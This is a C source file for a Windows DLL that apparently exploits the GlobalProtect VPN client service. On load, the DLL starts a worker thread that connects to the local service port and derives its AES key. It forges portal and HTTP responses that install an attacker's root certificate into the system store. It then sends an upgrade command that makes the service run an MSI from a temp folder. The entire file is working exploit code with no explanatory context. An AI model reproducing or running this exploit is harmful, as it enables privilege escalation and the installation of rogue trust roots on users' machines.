#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

//gcc gpcaupgrade.c crypt.c -o gpcaupgrade.dll -shared -Wall -lws2_32

#define ENCRYPT 1
#define DECRYPT 2

int crypt_aes_256_cbc(char *, char *, DWORD, DWORD, int);
char *derive_aes_key(void);

char *RPCHTTPResponseCommand =
"<request>\n"
	"<type>https_request</type>\n"
	"<reqid>%d</reqid>\n"
	"<result>%s</result>\n"
"</request>";

char *RPCUpgradeCommand = 
"<request>\n"
	"<type>software-upgrade</type>\n"
	"<command-line>c:\\windows\\temp\\pagp\\GlobalProtect.msi</command-line>\n"
"</request>";

char *RPCPortalCommand = 
"<request>\n"
"	<type>portal</type>\n"
"	<portal>www.paloaltonetworks.com</portal>\n"
"	<user>user</user>\n"
"	<passwd>aaa</passwd>\n"
"</request>";

char *HTTPPreloginResponse = 
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<prelogin-response>\n"
"	<status>Success</status>\n"
"</prelogin-response>";

char *HTTPInstallCAResponse = 
"<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n"
"<policy>\n"
"  <agent-ui></agent-ui>\n"
"  <agent-config></agent-config>\n"
"  <gateways></gateways>\n"
"  <root-ca>\n"
"    <entry name=\"GlobalProtectCA\">\n"
"      <cert>\n"
"-----BEGIN CERTIFICATE-----\n"
"MIIDFTCCAf2gAwIBAgIUH6De/J9zLdAL4c/pZsCgmScYd8swDQYJKoZIhvcNAQEL\n"
"BQAwGjEYMBYGA1UEAwwPR2xvYmFsUHJvdGVjdENBMB4XDTI0MTIxODEyMTk0OVoX\n"
"DTM0MTIxNjEyMTk0OVowGjEYMBYGA1UEAwwPR2xvYmFsUHJvdGVjdENBMIIBIjAN\n"
"BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyBloPhxzaNfhLSz/Gc/o/yOJptP3\n"
"ilqyPylO7cmSu3L5cPMVavSO32vz1ptaJMI6wECekN8wAmgVhYj4ncmnX5fovy8V\n"
"LCpOAOjo88zaIfawy8qzKGOkrbVW0XwT+VI9NTfO5jbMkFQQpMNAH+1CTjQvTPa/\n"
"5BTgSyuaEdo3HzXVBtfM23E7RUjvdJKGhNtWa0O2UNzpGTqu22JmcHBHkJSpBEpb\n"
"PtnDqkq69yCx1CpbYDuOSwjFzSRGEVKb7kJuyAUlBFXQWgKuOoIQA+xkLjVcsJTP\n"
"XFybwJcIcyI6eTXMAylxupDlz+uOpT4YtgzJO6KRBXPsY7CN4MUT4IR1aQIDAQAB\n"
"o1MwUTAdBgNVHQ4EFgQUR82pVdU+fPbRf9vmNKIxTe3olNcwHwYDVR0jBBgwFoAU\n"
"R82pVdU+fPbRf9vmNKIxTe3olNcwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0B\n"
"AQsFAAOCAQEAadMY+JlKQ6HvYOe6pKRxJq5etN+9yD+VHqG7PoXCWVVz3051A/Hx\n"
"iBUIVNWPK6tashUzmGfk+5Rj/fTqT4u3QP6Q4oXBv8J01exKzWobMTeax3S6mbfH\n"
"i6Yat4wPnzOOwdQLKzLuQ7Q+FGrrKy3eUALqyEHxhiqwu9aFOj/ehHFHvZqCGupb\n"
"1rCfPLsYy2pMo419hj0yW88cW5TF8IAydHQiXOaEoomIaklHIkGsMPNF0mlkB2mw\n"
"4D3XTUGZ3zygOI8lBX0onwORlX8xXIrPBjjZqMNuQDYSTxkIVJK/49eutQCAllcf\n"
"p7o8/CAsQV7wmoyZvdUgDXyGTUWF4PWAhA==\n"
"-----END CERTIFICATE-----\n"
"      </cert>\n"
"      <install-in-cert-store>yes</install-in-cert-store>\n"
"    </entry>\n"
"  </root-ca>\n"
"</policy>";

int SendRPCMessage(SOCKET Sock, char *DerivedAESKey, char *XMLMessage){
	char *CommandPacket;
	DWORD EncryptedCount;
	DWORD CommandPacketLen;
	DWORD XMLMessageLen;
	
	XMLMessageLen = strlen(XMLMessage);
	CommandPacketLen = 16 + XMLMessageLen + 1 + 16;
	CommandPacket = malloc(CommandPacketLen);
	memset(CommandPacket, 0, CommandPacketLen);
	memcpy(CommandPacket + 16, XMLMessage, XMLMessageLen + 1);
	
	if(!(EncryptedCount = crypt_aes_256_cbc(DerivedAESKey, CommandPacket + 16, XMLMessageLen + 1, CommandPacketLen - 16, ENCRYPT))){
		printf("Failed to decrypt credentials: 0x%lx", GetLastError());
		free(CommandPacket);
		return 0;
	}
		
	sprintf(CommandPacket, "%ld", EncryptedCount);

    if((send(Sock, (const char *) CommandPacket, 16 + EncryptedCount, 0) < 0)){
        printf("Failed to send RPC message: 0x%x\n", WSAGetLastError());
		free(CommandPacket);
        WSACleanup();
		return 0;
    }
		
	free(CommandPacket);
		
	return 1;
}

char *RecvRPCMessage(SOCKET Sock, char *DerivedAESKey){
	char ServerResponseLen[16];
	char *ServerResponse;
	int MessageLength;
	int DecryptedCount;
	
	if(recv(Sock, ServerResponseLen, 16, 0) == SOCKET_ERROR){
		printf("Failed to receive RPC message length: 0x%x\n", WSAGetLastError());
		return 0;
	}
	
	MessageLength = atoi(ServerResponseLen);
	ServerResponse = malloc(MessageLength);
	
	if(recv(Sock, ServerResponse, MessageLength, 0) == SOCKET_ERROR){
		printf("Failed to receive RPC message: 0x%x\n", WSAGetLastError());
		free(ServerResponse);		
		return 0;
	}
	
	if(!(DecryptedCount = crypt_aes_256_cbc(DerivedAESKey, (char *) ServerResponse, MessageLength, 0, DECRYPT))){
		printf("Failed to decrypt RPC message body: 0x%x\n", WSAGetLastError());
		free(ServerResponse);	
		return 0;		
	}
				
	return ServerResponse;
}

char *EncryptAndEncode(char *DerivedAESKey, char *ResponseMessage){
	char *EncodedMessage;
	char *BufferPacket;
	int EncodeIndex;
	DWORD EncryptedCount;
	DWORD ResponseMessageLen;
	DWORD BufferPacketLen;

	ResponseMessageLen = strlen(ResponseMessage);
	BufferPacketLen = ResponseMessageLen + 1 + 16;
	BufferPacket = malloc(BufferPacketLen);
	memset(BufferPacket, 0, BufferPacketLen);
	memcpy(BufferPacket, ResponseMessage, ResponseMessageLen + 1);

	if(!(EncryptedCount = crypt_aes_256_cbc(DerivedAESKey, BufferPacket, ResponseMessageLen + 1, BufferPacketLen, ENCRYPT))){
		printf("Failed to decrypt credentials: 0x%lx", GetLastError());
		free(BufferPacket);
		return 0;
	}

	EncodedMessage = malloc(EncryptedCount * 2);

	for(EncodeIndex = 0; EncodeIndex < EncryptedCount; EncodeIndex++)
		sprintf(EncodedMessage+(EncodeIndex*2), "%02x", BufferPacket[EncodeIndex] & 0xFF);

	free(BufferPacket);

	return EncodedMessage;
}

int SendHTTPResponse(SOCKET sock, char *DerivedAESKey, char *ResponseMessage, int MessageID){
	char *EncodedResponseMessage;
	char *ResponseCommand;
	int SendResponse;
	DWORD ResponseCommandLen;
	char TmpMesageID[16];
	int TmpMessageLen;
	
	TmpMessageLen = sprintf(TmpMesageID, "%d", MessageID);
	EncodedResponseMessage = EncryptAndEncode(DerivedAESKey, ResponseMessage);
	ResponseCommandLen = strlen(RPCHTTPResponseCommand) + TmpMessageLen + strlen(EncodedResponseMessage);
	ResponseCommand = malloc(ResponseCommandLen + 1);
		
	sprintf(ResponseCommand, RPCHTTPResponseCommand, MessageID, EncodedResponseMessage);
	SendResponse = SendRPCMessage(sock, DerivedAESKey, ResponseCommand);

	free(EncodedResponseMessage);
	free(ResponseCommand);

	return SendResponse;
}

SOCKET NetworkInit(void){
	SOCKADDR_IN server_addr;
	SOCKET Sock;
    WSADATA wsa;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock, error code: 0x%x\n", WSAGetLastError());
		return 0;
    }

    if ((Sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed, error code: 0x%x\n", WSAGetLastError());
        WSACleanup();
		return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4767);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(Sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        printf("Connection failed, error code: 0x%x\n", WSAGetLastError());
        WSACleanup();
		return 0;
    }

    printf("Connected to service\n");
	
	return Sock;
}

DWORD WINAPI WorkerThread(LPVOID lpParameter){
	SOCKET Sock;
	char *DerivedAESKey;
	char *RequestIDStr;
	int RequestID;
	char *MessageType;
	char *RPCMessage;
	char *MessageBody;
	FILE *Dummy;
	
	AllocConsole();
	freopen_s(&Dummy, "CONIN$", "r", stdin);
	freopen_s(&Dummy, "CONOUT$", "w", stderr);
	freopen_s(&Dummy, "CONOUT$", "w", stdout);
	
	if(!(Sock = NetworkInit())){
		printf("Failed to connect to RPC service: 0x%lx\n", GetLastError());
		return 1;
	}
	
	if(!(DerivedAESKey = derive_aes_key())){
		printf("Failed to derive AES key: 0x%lx\n", GetLastError());
		closesocket(Sock);
		return 1;
	}
	
	printf("Sending RPC Portal command\n");
	
	if(!SendRPCMessage(Sock, DerivedAESKey, RPCPortalCommand)){
		printf("Failed to send portal RPC command: 0x%lx\n", GetLastError());
		return 1;
	}

	while(1){
		if(!(RPCMessage = RecvRPCMessage(Sock, DerivedAESKey))){
			printf("Error receiving RPC message during negotiation: 0x%lx\n", GetLastError());
			free(DerivedAESKey);
			closesocket(Sock);
			return 1;
		}
		MessageType = strstr(RPCMessage, "</type>");
		MessageBody = MessageType + strlen("</type>");
		MessageType[0] = 0;
		MessageType = strstr(RPCMessage, "<type>") + strlen("<type>");
		printf("Received RPC message type: %s\n", MessageType);		
		if(!strcmp(MessageType, "https_request")){
			if(strstr(MessageBody, "/global-protect/prelogin.esp")){
				RequestIDStr = strstr(MessageBody, "REQID=") + strlen("REQID=");
				sscanf(RequestIDStr, "%d", &RequestID);
				printf("Sending HTTP prelogin response\n");
				if(!SendHTTPResponse(Sock, DerivedAESKey, HTTPPreloginResponse, RequestID)){
					printf("Failed to send prelogin response: %lx\n", GetLastError());
					free(DerivedAESKey);
					closesocket(Sock);
					return 1;
				}
			}else if(strstr(MessageBody, "/global-protect/getconfig.esp")){
				RequestIDStr = strstr(MessageBody, "REQID=") + strlen("REQID=");
				sscanf(RequestIDStr, "%d", &RequestID);
				printf("Sending HTTP getconfig response\n");
				if(!SendHTTPResponse(Sock, DerivedAESKey, HTTPInstallCAResponse, RequestID)){
					printf("Failed to send getconfig response: %lx\n", GetLastError());
					free(DerivedAESKey);
					closesocket(Sock);
					return 1;
				}
			}else
				printf("Unknown http_request type\n");
		}else if(!strcmp(MessageType, "hip")){
			printf("Sending RPC upgrade command\n");
			if(!SendRPCMessage(Sock, DerivedAESKey, RPCUpgradeCommand)){
				printf("Failed to send RPC upgrade command: 0x%lx\n", GetLastError());
				free(DerivedAESKey);
				closesocket(Sock);
				return 1;
			}
            printf("Waiting 120 seconds for upgrade delay\n");
            fflush(stdout);
		}
		free(RPCMessage);
	}
	
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){
    switch(ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) &WorkerThread, (LPVOID) NULL, 0, NULL);
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
    }
    return TRUE;
}

void __declspec(dllexport) Block(void){
	HANDLE hStopEvent;
	
	hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	WaitForSingleObject(hStopEvent, INFINITE);
}
